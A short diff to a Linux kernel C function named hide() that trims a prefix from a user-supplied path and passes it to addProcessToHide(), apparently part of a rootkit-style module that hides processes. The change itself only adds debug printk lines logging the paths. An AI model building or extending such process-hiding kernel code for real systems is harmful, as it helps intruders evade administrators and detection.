@@ -32,7 +32,7 @@ int hide(const char __user *path) {
     kfree(_path);
     return result;
   }
-  printk("here\n");
+  printk("%s\n", _path);
   tempPath = kcalloc(strlen(_path) - strlen(hide__prefix),1,GFP_KERNEL);
   if(IS_ERR_OR_NULL(tempPath)){
     kfree(_path);
@@ -44,6 +44,7 @@ int hide(const char __user *path) {
     kfree(tempPath);
     return result;
   }
+  printk("%s\n", tempPath);
   //      printk("%s",tempPath);
   result = addProcessToHide(tempPath);
   kfree(_path);
